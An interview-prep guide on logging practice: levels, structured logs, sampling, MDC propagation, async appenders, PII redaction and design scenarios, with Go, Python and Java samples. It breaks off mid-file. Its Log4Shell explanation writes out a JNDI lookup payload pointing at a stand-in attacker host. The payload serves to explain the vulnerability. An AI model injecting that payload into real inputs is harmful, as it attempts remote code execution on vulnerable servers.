# Logging — Interview Questions

> **Topic:** [Logging Roadmap](README.md)
> **Focus:** Interview-style questions covering logging fundamentals, language ecosystems, traps, design scenarios, and behavioral signals.

---

## Introduction

Logging interviews are deceptively easy on the surface — most candidates can write `logger.info("hello")`. The signal comes from the second layer: do you understand the difference between a log line and a metric, why DEBUG-gated string concatenation is still expensive, why MDC values bleed across thread pools, why your async appender's queue policy is a production decision, and why logging a customer's email at INFO is a GDPR ticket waiting to happen.

This file collects the questions that actually get asked at senior, staff, and principal interviews — at companies that run real logging pipelines and pay real money for log ingest. Each question has an answer that goes beyond the textbook so you can reason out loud about trade-offs. Tricky questions explicitly call out the wrong instinct so you can recognize it in yourself.

Use this file as both prep and a checklist. If you can answer the Tricky and System sections cleanly, you are well past mid-level on this topic.

---

## Table of Contents

1. [Conceptual / Foundational](#conceptual--foundational)
2. [Language-Specific](#language-specific)
3. [Tricky / Trap Questions](#tricky--trap-questions)
4. [System / Design Scenarios](#system--design-scenarios)
5. [Coding Questions](#coding-questions)
6. [Behavioral / Experience](#behavioral--experience)
7. [What I'd Ask a Candidate Now](#what-id-ask-a-candidate-now)
8. [Cheat Sheet](#cheat-sheet)
9. [Further Reading](#further-reading)
10. [Related Topics](#related-topics)

---

## Conceptual / Foundational

### Q: What's the difference between a log, a metric, and a trace?

A **log** is a discrete event with arbitrary context — "user 42 placed order 99 at 12:01, total $35.20". High-cardinality, semi-structured, answers "what happened in this exact moment". A **metric** is a numeric measurement aggregated over time — `orders_placed_total{region=us-east}`. Low-cardinality (label sets must stay bounded), pre-aggregated, answers "how is the system trending". A **trace** is a causally-linked sequence of spans across services, each tagged with start time, duration, attributes; answers "where did time go for this one request".

The three are not interchangeable: you can derive metrics from logs (expensive at scale), but you cannot reconstruct logs from metrics. Modern observability ships all three with shared correlation IDs so an alert (metric) drills into traces, which lead to logs.

### Q: When should something be a log line vs a metric?

If you need to know **how often** or **how long**, it is a metric — counters and histograms are cheap, queryable, aggregable. If you need to know the **specific instance** — which user, which order, which stack — it is a log. The trap: teams emit `logger.info("request handled")` and grep to count requests. Wrong — that should be a counter with region/status labels. Use logs for context, metrics for aggregation. Rule of thumb: if your dashboards query it, metric; if your incident-response greps it, log.

### Q: What are the standard log levels and when to use each?

The conventional ladder (high → low severity):

| Level | Meaning | When |
|-------|---------|------|
| FATAL | Process cannot continue | About to call `exit(1)` |
| ERROR | A user-visible operation failed | 5xx, failed write, broken invariant |
| WARN  | Recoverable but worth noticing | Retried, fell back, deprecated path |
| INFO  | Notable business event | Order placed, user signed up |
| DEBUG | Developer-facing internal state | Variable values, branch taken |
| TRACE | Extremely verbose | Per-byte, per-iteration detail |

INFO is the prod floor; DEBUG/TRACE are off. Common misuse: WARN for expected events (rate-limit hit on a public API) trains operators to ignore real WARNs. If everything is a warning, nothing is.

### Q: Why is `print` discouraged in production code?

No level gating (can't disable without redeploy), no structure (unindexable strings), no timestamps or process metadata, synchronous line-buffered I/O that blocks handlers at high QPS, no destination control, no test injection point. Fine for a 10-line script. In production, even the cheapest logger (pino, zerolog, slog) gives level gating, structure, and async I/O at near-zero overhead.

### Q: What does 12-factor say about logging?

Factor XI: **treat logs as event streams**. The app writes unbuffered to stdout/stderr; it does **not** manage files, rotation, shipping, or destinations — that's the execution environment's job. Container writes JSON to stdout; the platform (Kubernetes, ECS) captures it; a shipper (Fluent Bit, Vector) forwards to a sink (Loki, Elasticsearch, S3). Same binary works in dev (terminal), staging (Loki), prod (SIEM) with zero code changes — only environment config differs.

### Q: What is structured logging? Why does it matter for ops?

Structured logging emits each event as a set of key-value pairs, typically rendered as JSON:

```json
{"ts":"2026-05-29T10:00:00Z","level":"info","msg":"order_placed","user_id":42,"order_id":"o_99","total_cents":3520,"region":"us-east"}
```

The contrast: traditional text logging emits `"User 42 placed order o_99 for $35.20 in us-east"`. Both are human-readable, but only the structured form is machine-queryable.

Why ops cares: at 3 AM you want `level=error AND user_id=42 AND ts > now-15m`. With text, you grep and pray your regex catches every format variant — 30 minutes. With structured logs, you query an index — 30 seconds. Single highest-leverage logging investment a team can make.

### Q: What is a correlation ID? Difference from a trace ID?

A **correlation ID** is an opaque identifier attached to all log lines and outbound calls for a single logical unit of work — stamped at the edge, propagated via `X-Request-ID`, returned to the client. A **trace ID** is the same concept defined by a tracing system (W3C Trace Context, OTel) with a structured format and paired with span IDs. Many teams use the trace ID **as** the correlation ID — one identifier everywhere. The distinction matters when correlation predates tracing, or when you want a human-friendly support ID separate from the cryptographic trace ID.

### Q: Why is high cardinality OK in logs but bad in metrics?

A metric with N unique label combinations creates N time series; each eats TSDB memory. A `user_id` label on a counter explodes to millions of series, OOMs Prometheus, and bricks alerting — the famous "label cardinality" problem. A log line with a `user_id` field is one record with one field; storage scales with event count, not unique values. Indexers (Elasticsearch, Loki, ClickHouse) are built for it. Rule: identifiers (user_id, order_id, request_id) belong in **log fields, not metric labels**. Metric labels stay low-cardinality (region, endpoint, status_code).

### Q: Why does GDPR care about logs?

Logs frequently contain personal data — emails, names, IPs, user IDs, sometimes full request bodies. Under GDPR (and CCPA, LGPD): purpose limitation (only for documented purposes), storage limitation (defined retention; 7-year-old customer emails are illegal absent a legal basis), right to erasure (delete on request, painful for append-only logs), right to access (SAR can include logs), and breach notification (a compromised log store starts a 72-hour clock). Practical answer: **redact PII at the source**. Engineers shouldn't be able to accidentally log emails. Centralized redaction processors + linters + code review.

### Q: What is tail-based sampling?

Tail-based sampling makes the keep/drop decision **after** a trace completes, based on properties of the whole trace — duration, error status, attributes. Example: keep every trace with an error, every trace slower than 1s, plus 1% of normal traces. You keep the interesting traces with 100% fidelity while paying only for a small sample of healthy ones — cost goes from O(traffic) to O(errors + outliers + sampled_baseline). Complication: you must **buffer all spans** for a trace until decision time, requiring a centralized collector (OTel Collector with a tail-sampling processor) and bounded buffer memory. Spans from different services for the same trace must reach the same collector instance, or you shard by hashing trace ID.

### Q: What's the difference between head-based and tail-based sampling?

**Head-based**: decision at the **start** of the trace, propagated via `traceparent` sampled flag. Simple, stateless, no buffering — default in most OTel SDKs. Downside: misses rare errors not sampled at the head. **Tail-based**: decision at the **end**, after seeing the full trace. Stateful (needs a collector and per-trace buffer), but biases toward keeping problems. Most production systems combine both — head-based drops obvious chatter at the source, tail-based at the collector applies fine-grained bias.

### Q: Why are async appenders safer than sync appenders in high-QPS services?

A sync appender blocks the caller until the log line lands at its destination. At 10k req/s, any I/O hiccup from the log sink propagates to request latency — a slow disk fsync becomes a p99 spike on your API. An async appender hands the event to an in-memory ring buffer and returns immediately; a separate I/O thread drains the buffer. The trade-off: the buffer is bounded, and under sustained overload you must pick a policy (block, drop, drop oldest), which is itself an interview question.

### Q: Why is `logger.debug("x=" + expensiveCall())` bad even when DEBUG is off?

Most logging frameworks check level at runtime, **after** arguments evaluate. The `expensiveCall()` runs and the string concatenation happens before the logger decides to no-op. The cost is paid; the output is just dropped. Fix with lazy evaluation: `{}` placeholders in SLF4J, `%s`-style in Python `logging`, structured key-value in slog/zap, or an explicit `if logger.isDebugEnabled()` guard for genuinely expensive messages. Many "logging slowed us down" incidents trace to this.

### Q: What is log fan-out and why is it dangerous?

Fan-out is when one underlying event produces many log lines as it bubbles through retries, interceptors, and resilience layers — the retry library logs WARN, the outer caller logs WARN, the framework interceptor logs WARN, all for the same network failure. You triple or decuple log volume during incidents, exactly when ingest is already under pressure. Fix: log at the outermost boundary that has full context, emit one structured event with `attempts=3, last_error=...`, and rely on traces for internal detail.

---

## Language-Specific

### Go

#### Q: When would you choose `slog` over `zap` or `zerolog`?

`slog` (stdlib since Go 1.21) is the right default: structured, zero deps, idiomatic, supported by everything going forward. `zap` (Uber) wins on raw throughput, battle-tested at scale — pick it for hot-path code where allocation profiling shows logger overhead. `zerolog` is even more allocation-conscious, building JSON directly into a byte buffer via a chained API; slightly less ergonomic, slightly faster than zap, but the gap rarely matters in practice. Interview answer: "I default to slog and only swap to zap if benchmarks show logging is a bottleneck — which usually means I should log less, not log faster."

#### Q: How do you add a request_id to every log line in a handler chain in Go?

Use a context-aware logger. Two patterns:

1. **`slog` with context**: `slog.InfoContext(ctx, "msg", "key", val)` — your handler can extract a request_id from `ctx` and add it.

```go
type ctxKey int
const reqIDKey ctxKey = 0

func WithRequestID(ctx context.Context, id string) context.Context {
    return context.WithValue(ctx, reqIDKey, id)
}

type contextHandler struct{ slog.Handler }
func (h contextHandler) Handle(ctx context.Context, r slog.Record) error {
    if id, ok := ctx.Value(reqIDKey).(string); ok {
        r.AddAttrs(slog.String("request_id", id))
    }
    return h.Handler.Handle(ctx, r)
}
```

2. **Per-request child logger**: derive a logger with the request_id baked in and pass it through (or store in context).

```go
reqLogger := logger.With("request_id", id)
ctx = ContextWithLogger(ctx, reqLogger)
```

The first scales better when context is already plumbed everywhere; the second is more explicit.

#### Q: How does level-gating work in zap and slog? Why does it matter?

Both use atomic-loaded levels — a disabled level returns an immediate no-op. `slog` uses `slog.LevelVar` with `Set(level)`; `zap` uses `zap.AtomicLevel` (even exposes an HTTP handler). Why it matters: in an incident you need to enable DEBUG for one process without redeploying. "How do you turn on debug logging in prod for 5 minutes" — atomic levels + admin endpoint is the answer.

#### Q: How do you sample logs in Go to control cost?

Two strategies:

1. **Per-key sampling** in `zap`: `zap.Sampling` keeps the first N events per second per (level, message), drops the rest. Effective for spammy log lines like "cache miss".

```go
core := zapcore.NewSamplerWithOptions(
    zapcore.NewCore(enc, sink, level),
    time.Second, 100, 10, // first 100/s, then every 10th
)
```

2. **Application-level sampling**: in business code, only log every Nth event, or sample with a probability tied to trace sampling so logs and traces stay correlated.

`slog` does not ship sampling out of the box — wrap your `Handler` in a custom sampling handler if needed.

### Python

#### Q: `logging` vs `structlog` vs `loguru` — when to use which?

**`logging`** is the stdlib. Verbose to configure, plays well with everything (Django, Flask, every library logs through it). Use it for libraries you publish — never force a logger choice on your users.

**`structlog`** is the production-grade structured option. It composes the log record through a chain of "processors" (add timestamp, add level, render JSON), supports `contextvars` for async-safe context binding, integrates with stdlib `logging` for routing. Use it for new services where you control the stack.

**`loguru`** is the developer-experience choice — single import, sane defaults, built-in colorized output, file rotation. Use it for scripts, CLIs, and small services where ergonomics > extensibility.

The trap question: "if you had to ship a library to PyPI, which would you use?" Answer: stdlib `logging`. A library should never force `loguru` or `structlog` on the consumer.

#### Q: `LoggerAdapter` vs `contextvars` — what's the difference?

`LoggerAdapter` wraps a logger with a fixed `extra` dict added to every call — bound at creation, passed explicitly through call chains. `contextvars` is Python's async-safe thread-local: set in request middleware, read by any code in the same task without plumbing (`structlog.contextvars.bind_contextvars(request_id=rid)`). Use `contextvars` for cross-cutting context; use `LoggerAdapter` when you want a scoped logger for a specific component. Async trap: `threading.local` does NOT propagate across `await`; `contextvars` does. In asyncio, `contextvars` is mandatory.

#### Q: Python `logging` performance under high QPS — what should you watch?

`logging.getLogger(__name__)` is cached and cheap. `%`-style formatting is lazy (`logger.info("x=%s", x)`); `f"x={x}"` evaluates eagerly — prefer the former for DEBUG. The default handler is synchronous and holds a lock; at 10k QPS GIL contention becomes visible — use `QueueHandler` + `QueueListener` to push records to a background thread (an order of magnitude throughput boost before any structural changes). Stdlib `json` is 5-10x slower than `orjson`; use a custom formatter. `extra` dict allocation matters at scale — prefer a `Filter` that pulls from `contextvars` once.

### Java

#### Q: Why SLF4J + Logback rather than `java.util.logging`?

SLF4J is the **facade**, not an implementation. Code logs via `org.slf4j.Logger`; the runtime binds to Logback, Log4j2, or jul. Libraries can log without forcing a backend on consumers — Spring and every major library target SLF4J. Logback is the modern reference implementation: MDC, async appenders, conditional config, JSON encoders via logstash-logback-encoder. `java.util.logging` is functional but lacks the ecosystem.

#### Q: What is MDC and how does it propagate across thread pools?

**MDC (Mapped Diagnostic Context)** is a thread-local key-value map that SLF4J/Logback automatically includes on every log line. `MDC.put("request_id", id)` at the start of a request makes `request_id` appear on every subsequent log call from that thread.

The problem: when work crosses thread boundaries (executor, CompletableFuture, reactive streams), MDC does **not** automatically follow. The new thread sees the stale or empty MDC.

Fixes:
1. **Wrap your Runnables**: capture MDC before submission, restore it inside `run()`.
   ```java
   Map<String, String> ctx = MDC.getCopyOfContextMap();
   executor.submit(() -> {
       MDC.setContextMap(ctx);
       try { work(); } finally { MDC.clear(); }
   });
   ```
2. **Use a wrapper executor**: `MdcTaskDecorator` (Spring) or a custom `ExecutorService` decorator.
3. **For reactive (Reactor)**: use `Context` and a hook to translate to MDC at log time, since reactive operators jump threads constantly.

Forgetting to clear MDC after a request is the **MDC bleed** bug — next request on the same pooled thread sees stale data.

#### Q: How do async appenders work in Logback? What's the failure mode?

`AsyncAppender` wraps a target and feeds it from a bounded `BlockingQueue`. Caller posts (cheap); a background thread drains. Failure modes: queue full (default drops INFO/DEBUG and blocks on WARN/ERROR; `discardingThreshold=0` disables dropping; `neverBlock=true` drops everything); slow target builds back-pressure; JVM shutdown may have undrained events (configure `shutdownHook` + flush timeout). Better at production scale: **Log4j2 AsyncLogger** on the LMAX Disruptor — lock-free ring buffer, single-digit µs enqueue, much higher throughput.

#### Q: Explain the log4j CVE (Log4Shell). Root cause and lessons?

CVE-2021-44228 (Dec 2021). Log4j2 supported **lookup substitution** in messages: `${jndi:ldap://attacker.com/x}` inside a logged string triggered a JNDI lookup to an attacker LDAP server, which returned a serialized Java object that was deserialized and executed — RCE via a log line. Trigger surface was enormous: any user-controlled string ever logged (User-Agent, form fields, search queries) was an attack vector. Lessons: logging is not safe from input (log lines are code-adjacent); avoid Turing-complete features in log formatters; defense in depth (deny egress from log threads, deny class loading); SBOM + fast patching — knowing which services used which version was the rate-limiting step.

### Node.js

#### Q: `pino` vs `winston` — what's the difference?

`pino` is JSON-first and optimized for throughput. NDJSON to stdout by default; expensive operations (pretty formatting, file rotation) are pushed to a separate "transport" via worker threads. Single-digit µs per log call. `winston` is older, more featureful in-process (multiple transports, custom formats), but pays for it in performance — default JSON serialization is markedly slower than pino's hand-rolled buffer writes. At scale, pino is the safer pick. Winston is fine for low-QPS services where dev-time flexibility matters more than per-log cost.

#### Q: What does pino mean by "JSON-first"?

It never builds an intermediate object — writes JSON directly to a `Buffer` by interpolating values into hand-tuned templates, then writes the buffer to the output stream. No `JSON.stringify` per log line. Consequences: performance (significantly faster), no human default (pipe through `pino-pretty` for dev), transports in a worker thread (file rotation, network ship don't block the event loop). The philosophy: dev-time prettiness is not the logger's job, it is a transformation on the stream.

#### Q: Why is `console.log` discouraged in production Node services?

`console.log` is synchronous when writing to a file or piped stdout (it can block the event loop), uses `util.format` which is slow, and produces unstructured output. Pino-style loggers are async by default, structured by default, and 10-50x faster. In a server doing 5000 req/s, replacing `console.log` with pino has measurable throughput impact.

---

## Tricky / Trap Questions

### Q: Your async appender's queue is full. Should you block, drop, or buffer?

Wrong instinct: "block — we can't lose logs". Dangerous. If the queue is full because the sink is slow, blocking propagates slowness into the request path — logging outage becomes application outage. Trade-offs:

| Policy | Pro | Con |
|--------|-----|-----|
| Block | No data loss | App latency tied to log sink |
| Drop | App stays fast | Lose visibility exactly when you need it |
| Drop oldest | Newest data preserved | Lose historical context for current incident |
| Spill to disk | No loss, decoupled | Disk I/O, capacity planning, drainer required |

Right answer depends on the data: **drop INFO/DEBUG, keep ERROR** (Logback's default), and emit a `logs_dropped_total` metric to alert on dropping. Critical events (audit, security) go through a separate non-droppable path.

### Q: Why is `log.debug('got ' + expensiveCall())` bad even when DEBUG is off?

Concatenation and `expensiveCall()` evaluate **before** `log.debug` is called — level check is too late, cost is paid. Lazy fixes: SLF4J `{}` placeholders fill only if enabled, but argument values still evaluate eagerly — use a Supplier: `log.atDebug().setMessage("got {}").addArgument(() -> expensiveCall()).log()`. Go slog: arguments are still eager; use `if logger.Enabled(ctx, slog.LevelDebug)`. Python: `logger.debug("x=%s", x)` is lazy. Trap candidates fall into: they "know" DEBUG is off and assume the line is free.

### Q: When you set Logback level to ERROR, what happens to existing INFO log statements?

They run up to the level check and then no-op. Eager arguments still construct; the logger call still happens; no handlers fire, no encoding, no I/O. Critical nuance: **child loggers can override**. `com.example.foo` at INFO trumps root ERROR. If root is ERROR but a child is still DEBUG (from XML), you still see DEBUG from that subtree. Many "why are we still logging" tickets trace to a forgotten per-package level.

### Q: Why might MDC values bleed from one request into another?

MDC is a `ThreadLocal`, and HTTP servers reuse pool threads. If a handler sets MDC and forgets `MDC.clear()`, the **next request on the same thread** sees stale values — log lines for request B show A's request_id. Fix: always clear in a `finally` at the request boundary — `try { chain.doFilter(); } finally { MDC.clear(); }`. A subtler variant: code submits work to an executor, the worker sets MDC, returns to the pool still set, next caller sees ghost values.

### Q: What's wrong with logging a customer's email at INFO level?

GDPR — emails are personal data; INFO logs retain 7-30+ days, often without documented legal basis. Access control — INFO logs flow to Splunk/ELK/Datadog accessible to every engineer; not data every engineer needs. Breach blast radius — compromised log store leaks the email list. Right-to-erasure friction — deletion requests become compliance work. Cross-jurisdictional — shipping EU users' data to a US SaaS is a transfer question. Right approach: log an opaque identifier (user_id, hashed email), redact PII at the source, treat any PII slip as an incident.

### Q: If your log pipeline can ingest 1MB/s and you emit 10MB/s, what happens?

Depends on pipeline shape: app-queue fills (drops or blocks → latency spikes); shipper buffer fills (applies its back-pressure policy, often drops); shipper disk spill fills disk (crash); UDP/syslog sinks drop packets silently. You lose logs somewhere; the question is **where, predictably**. Wrong instinct: "we need a bigger pipeline". Actual fix: log less (sampling, level discipline, drop chatter) — 10x oversize is structural. Also: upstream may bill for the 10MB/s even when it drops. Always alert on emit rate, not just ingest.

### Q: Your service prints a 50KB stack trace on every 5xx. What goes wrong at scale?

At 100 err/s: 5MB/s from stacks alone — thousands of dollars/month and retention budget burned on duplicates. Issues: storage (ES tokenization slows on long fields); duplication (1M copies of one trace; you need one + a count); cardinality bombs (dynamic values in frames kill dedup); silent truncation (sinks cut at 32-64KB). Fixes: hash stacks, log fingerprint + count, full trace one in N; dedup at the appender (Logback `DuplicateMessageFilter`); sample ERROR after first few per minute per class; ship to a real error tracker (Sentry/Bugsnag) designed for it.

### Q: You catch a 4xx exception and log it at ERROR. Why is that wrong?

A 4xx (`ValidationError`, `NotFound`, `Unauthorized`) is a **client problem**, not a server problem. ERROR pages on-call for user typos; real ERRORs get drowned out; dashboards show non-actionable error rates. Correct level: INFO/DEBUG (or a metric counter on the endpoint). Reserve ERROR for "engineer must look at". WARN for "client problem worth noticing if the rate spikes". Principle: **log levels are about the operator, not the event**. If nobody should care, it's not ERROR.

### Q: Your logs show `request_id=` (empty). Likely causes?

Middleware order — logger initialized before the request-id middleware (move it earlier). Async context loss — code jumped threads/awaits and context didn't propagate (`ThreadLocal` lost across executor; `AsyncLocalStorage` not threaded through). Background job — no request, set a job_id or omit the field instead of emitting empty. Default-value vs unset — your logger defaults `request_id=""` instead of omitting. Trick variant: empty for some logs and present for others in the same request — almost always async-context-loss in propagation.

### Q: Why is logging the SQL query a security concern even if you parameterize?

Parameterization protects the database layer; the parameter values are still real user data — passwords, tokens, PII. If you log the query with parameters interpolated for debugging, you've written secrets to your log store. Common case: ORM debug-mode dumps full queries with parameters. Turning on DEBUG in prod to investigate one issue dumps millions of secret-containing lines. Even without interpolation, the query shape leaks schema to anyone with log access.

### Q: A junior shipped `logger.info(json.dumps(request_body))`. What's wrong?

PII exposure (emails, names), secrets exposure (passwords, tokens), performance (`json.dumps` on every request), size (megabytes for uploads blows ingest budget), double-encoded JSON inside a JSON log value, and the loss of structure (body should be fields, not a string). Senior fix: pick specific fields, redact known PII paths, cap field size, log at DEBUG behind a flag.

### Q: Why might enabling DEBUG in prod cause an outage even on a healthy service?

Ingest overload (10-100x INFO volume back-pressures the app); slow sync handlers blocking request threads; PII exposure triggering an audit pause; cost spike on the log SaaS bill; previously-skipped expensive operations now running every request; library fan-out (HTTP client, ORM emit volumes you didn't anticipate). Always: enable DEBUG on one instance or a small percentage, watch metrics, expand gradually, have an off switch.

---

## System / Design Scenarios

### Q: Design the logging contract for a 50-service org

You need an organizational standard, not 50 ad-hoc conventions. The contract:

**Format**: JSON, one line per event. UTF-8.

**Required fields** on every log line:
- `ts` — RFC 3339 UTC timestamp with nanos
- `level` — debug, info, warn, error, fatal
- `service` — service name from a central registry
- `env` — prod, staging, dev
- `version` — deployed version/git SHA
- `msg` — short human-readable message (a stable event type, not a sentence with variables)
- `trace_id`, `span_id` — W3C Trace Context
- `request_id` — propagated via X-Request-ID

**Conventional fields** when present:
- `user_id`, `tenant_id`, `region`
- `http.method`, `http.status`, `http.path`, `http.duration_ms`
- `error.type`, `error.message`, `error.stack`

**Forbidden fields**:
- `password`, `token`, `secret`, `authorization`, `cookie`, `ssn`
- Full request/response bodies (use a hash + size)
- Email addresses, phone numbers (except in audit logs with explicit allowance)

**Enforcement**:
- Shared logging library per stack that emits the right schema by default
- Lint rule that flags forbidden field names in code
- Sink-side filter that drops/redacts known PII patterns as last line of defense
- Onboarding docs + example services

**Governance**: a logging-standards doc owned by Platform team, reviewed quarterly, with examples and a glossary mapping legacy fields to the standard.

The most common pitfall in this design: writing the doc but not building the library. Engineers will not read 30 pages of standards; they will use whatever the SDK gives them. Build the SDK first.

### Q: Design a sampling strategy for a 10k QPS service that pays $1000/day for logs

Numbers: 10k QPS × 86,400 s/day = 864M requests/day. $1000/day budget means $1.15 per million requests, so roughly $0.00000115 per request. At a typical $0.50–$2 per GB of log ingest, the budget supports something like 500GB–2TB/day. With three log lines per request and 1KB each, that's 2.6TB/day — overshoot.

Strategy:

1. **Eliminate WARN/INFO chatter** — audit which lines are emitted per request, kill duplicates from libraries.
2. **DEBUG off in prod** — assumed.
3. **Tail-based sampling at the ingest tier**:
   - Keep 100% of ERROR
   - Keep 100% of requests with duration > p99
   - Keep 100% of requests from `?diag=1` (diagnostic mode)
   - Keep 1% of clean requests, deterministically by hashing trace_id (so all spans of a trace share fate)
4. **Per-tenant biasing** — keep 10% for top-revenue tenants vs 1% baseline; ensure paying customers' incidents are debuggable.
5. **Aggressive sampling on cache/auth checks** — these are noisy and rarely interesting. Sample at 0.1%.
6. **Metrics for everything countable** — counts, durations, error types as metrics; logs only for instances.

Validate: project monthly cost, alert on actual vs projected, dashboard the sample rates per category, audit weekly.

### Q: How would you migrate a service from text logs to structured logs without downtime?

Phase plan:

**Phase 0: prep** (week 1)
- Decide the structured schema (use the org contract).
- Choose the structured logger (slog, structlog, etc.).
- Set up dual ingest: text logs continue to their existing sink; new JSON logs go to a separate index.

**Phase 1: dual emission** (week 2)
- Modify the logger wrapper to emit BOTH formats simultaneously.
- Existing tooling, dashboards, runbooks continue to work on text.
- New JSON dashboards built in parallel.

**Phase 2: parity validation** (weeks 3-4)
- Verify every existing alert can be reproduced on the JSON index.
- Verify runbooks work against JSON queries.
- Build new dashboards and confirm they match text-derived ones.

**Phase 3: cutover** (week 5)
- Switch alerts and dashboards to JSON.
- Stop emitting text logs (or keep at WARN/ERROR-only as a fallback for one month).

**Phase 4: cleanup** (week 6+)
- Remove text dependencies from runbooks.
- Decommission text index after retention window.

Key risks:
- **Dual emission doubles log volume** — temporarily acceptable, budget for it.
- **Field naming drift** — code may use `userId` in one place and `user_id` in another. Add lint.
- **Tribal knowledge** — operators muscle-memory grep against text patterns. Train them on the new query language.

### Q: Design PII redaction at the source so engineers can't accidentally log emails

Defense in depth across three layers:

**Layer 1: Type system / API design**
- Wrap PII in a `SecretString` / `PII<T>` type. Its `toString()` returns `"<redacted>"`. Logger formatters handle this type natively. Engineers can only get the value via `.unwrap()` which is searchable in code review.

**Layer 2: Logger-side processor**
- A pre-serialization processor scans every value: regex for email/phone/SSN/credit card; redacts and replaces with `<redacted-email>`. structlog processor, slog handler, logback turbo filter — every stack has this hook.

**Layer 3: Sink-side filter**
- The log shipper (Fluent Bit, Vector) applies the same regexes as last-resort. Catches things that bypass the SDK (e.g., container stdout from third-party libs).

**Out-of-band**: 
- Lint rule: flag any logger call whose arguments include a field/variable named `email`, `password`, `token`, `ssn`. Fail CI.
- Code review checklist with PII line items.
- A "PII detection" job that scans recent prod logs for regex matches and pages the team if anything sneaks through.

The principle: **make doing the wrong thing hard, and make doing it accidentally impossible**. One layer is bypassable; three layers gives you fail-safes.

### Q: Walk me through an incident where logs were misleading; how do you fix the logging?

Pattern incident: a payment service started returning 500s. Logs showed `"database connection failed"` at ERROR. On-call paged DBAs, who saw the DB was healthy. Hours of confusion before someone noticed the **client library** had a stale connection from a network partition; the DB had been fine the whole time.

Misleading because:
1. **Conflated layers** — "database connection failed" said nothing about which layer (pool, driver, network) failed.
2. **No correlation to upstream** — the log didn't include the upstream symptom (RST received, timeout, etc.).
3. **No telemetry from the connection pool itself** — invisible state.

Fix:
- **Better error wrapping** — preserve the underlying cause chain: `pool.borrow() -> driver.connect() -> tcp.dial(): connection refused`. Log all three layers.
- **Structured `error.type` and `error.cause`** — separately queryable.
- **Pool metrics** — active connections, wait time, recent failures.
- **Network-layer logging** — RST, timeout, DNS error as distinct events.
- **Runbook update** — when this signature appears, check both DB AND client pool, with specific queries.

The post-incident change: every error log line carries the full cause chain and a stable `error.type`. Cuts MTTR on similar incidents in half.

### Q: Design diagnostic-mode logging — verbose for one user, normal for everyone else

Use case: customer support tickets a problem; you want full DEBUG for that user's next 10 requests without flooding prod logs for everyone.

Design:

1. **Diagnostic flag in the request** — set by a header (`X-Debug: 1`), a cookie, a query parameter, or — most commonly — a server-side allowlist of `user_id`s in a fast key-value store.

2. **Per-request log level override** — at request entry, check the flag. If set, install a thread/context-local logger configured at DEBUG. If not, use the default INFO logger.

3. **Output isolation** — diagnostic logs go to a separate index/file so they don't pollute normal logs. Tagged with `diag=true`.

4. **Sampling exemption** — diagnostic requests bypass sampling. Tail-sampling sees the `diag=true` attribute and keeps everything.

5. **Time-bounded** — diagnostic flag has a TTL (15 minutes) so a forgotten flag doesn't run forever.

6. **Auth-gated** — only support engineers can set the diagnostic flag for a user, via an audited admin tool.

7. **Privacy** — diagnostic logs are still subject to PII redaction. Users can't opt-in to their PII being logged just because they want help.

Implementation pattern in Go:

```go
func DiagMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        userID := extractUserID(r)
        level := slog.LevelInfo
        if diagAllowlist.Has(userID) {
            level = slog.LevelDebug
        }
        logger := baseLogger.With("user_id", userID, "diag", level == slog.LevelDebug)
        ctx := WithLogger(r.Context(), logger.WithGroup("diag"))
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
```

The hardest part is not the code — it's the operational hygiene of allowlist TTLs and audit trails.

---

## Coding Questions

### Q: Implement an HTTP middleware in Go that emits one access log per request with request_id, method, path, status, duration_ms

```go
package main

import (
    "context"
    "log/slog"
    "net/http"
    "os"
    "time"

    "github.com/google/uuid"
)

type ctxKey int
const reqIDKey ctxKey = 0

func RequestIDFromContext(ctx context.Context) string {
    if v, ok := ctx.Value(reqIDKey).(string); ok {
        return v
    }
    return ""
}

type statusRecorder struct {
    http.ResponseWriter
    status int
}

func (s *statusRecorder) WriteHeader(code int) {
    s.status = code
    s.ResponseWriter.WriteHeader(code)
}

func AccessLog(logger *slog.Logger) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            start := time.Now()
            reqID := r.Header.Get("X-Request-ID")
            if reqID == "" {
                reqID = uuid.NewString()
            }
            ctx := context.WithValue(r.Context(), reqIDKey, reqID)
            rec := &statusRecorder{ResponseWriter: w, status: 200}
            w.Header().Set("X-Request-ID", reqID)

            next.ServeHTTP(rec, r.WithContext(ctx))

            logger.LogAttrs(ctx, slog.LevelInfo, "http_request",
                slog.String("request_id", reqID),
                slog.String("method", r.Method),
                slog.String("path", r.URL.Path),
                slog.Int("status", rec.status),
                slog.Int64("duration_ms", time.Since(start).Milliseconds()),
                slog.String("remote_addr", r.RemoteAddr),
            )
        })
    }
}

func main() {
    logger := slog.New(slog.NewJSONHandler(os.Stdout, nil))
    mux := http.NewServeMux()
    mux.HandleFunc("/hello", func(w http.ResponseWriter, r *http.Request) {
        w.Write([]byte("ok"))
    })
    handler := AccessLog(logger)(mux)
    http.ListenAndServe(":8080", handler)
}
```

Key points: one log line per request (not multiple), structured fields, request_id generated if absent and echoed in response header, status captured via a wrapped ResponseWriter, duration measured at the middleware boundary.

### Q: Implement a Python `structlog` processor that redacts any value matching an email regex

```python
import re
import structlog

EMAIL_RE = re.compile(r"[\w\.+-]+@[\w-]+\.[\w.-]+")

def redact_emails(logger, method_name, event_dict):
    """Recursively scan all values; replace email matches with <redacted>."""
    def scrub(v):
        if isinstance(v, str):
            return EMAIL_RE.sub("<redacted-email>", v)
        if isinstance(v, dict):
            return {k: scrub(x) for k, x in v.items()}
        if isinstance(v, (list, tuple)):
            return type(v)(scrub(x) for x in v)
        return v
    return {k: scrub(v) for k, v in event_dict.items()}


structlog.configure(
    processors=[
        structlog.contextvars.merge_contextvars,
        structlog.processors.add_log_level,
        structlog.processors.TimeStamper(fmt="iso"),
        redact_emails,
        structlog.processors.JSONRenderer(),
    ],
)

log = structlog.get_logger()
log.info("user_signup",
         email="alice@example.com",
         message="welcome alice@example.com",
         attrs={"primary": "bob@test.io"})
# {"level":"info","event":"user_signup","email":"<redacted-email>","message":"welcome <redacted-email>","attrs":{"primary":"<redacted-email>"},"timestamp":"..."}
```

Notes: the processor runs before JSON rendering so it sees structured values, not strings. Recursion handles nested dicts and lists. Place it before `JSONRenderer` in the chain — order matters.

### Q: Implement an SLF4J MDC filter that ensures `request_id` is set on every log line, with a clear after the response

```java
import jakarta.servlet.Filter;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.ServletRequest;
import jakarta.servlet.ServletResponse;
import jakarta.servlet.http.HttpServletRequest;
